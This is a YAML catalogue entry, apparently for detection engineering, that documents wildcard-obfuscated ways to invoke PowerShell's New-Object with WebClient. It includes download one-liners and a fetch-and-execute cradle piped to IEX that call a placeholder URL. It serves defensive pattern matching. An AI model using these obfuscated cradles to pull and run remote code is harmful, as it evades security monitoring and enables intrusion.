---
Name: New-Object
Description: "Creates .NET or COM objects. Used to instantiate WebClient for downloads, create COM shells, or access Windows APIs."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: download
MitreID: T1105
Patterns:
  - Pattern: "& (gcm N*-O*) System.Net.WebClient"
    Wildcards: ["*"]
    Notes: "Wildcards on both verb and noun"
  - Pattern: "& (gcm New-Ob*) System.Net.WebClient"
    Wildcards: ["*"]
    Notes: "Star matches 'ject'"
  - Pattern: "& (gcm N?w-Object) System.Net.WebClient"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'e'"
  - Pattern: "& (gcm N[d-f]w-Object) System.Net.WebClient"
    Wildcards: ["[d-f]"]
    Notes: "Character range matches 'e' in New"
  - Pattern: "(& (gcm N*-O*) Net.WebClient).DownloadFile('http://...','C:\\p.exe')"
    Wildcards: ["*"]
    Notes: "Full download one-liner with glob-resolved cmdlet"
  - Pattern: "& (gcm *Object) Net.WebClient"
    Wildcards: ["*"]
    Notes: "Prefix wildcard"
  - Pattern: "$w=(& (gcm N*-O*) Net.WebClient);$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')"
    Wildcards: ["*"]
    Notes: "gcm glob resolves New-Object; -clike 'D*g' resolves DownloadString on the WebClient instance via PSObject.Methods"
  - Pattern: "$w=(& (gcm N*-O*) Net.WebClient);$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')|&(DIR Alias:/I*X)"
    Wildcards: ["*"]
    Notes: "Triple-glob cradle: gcm on New-Object + -clike on DownloadString + DIR Alias:/I*X on IEX"
Resources:
  - https://attack.mitre.org/techniques/T1105/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object
  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
---
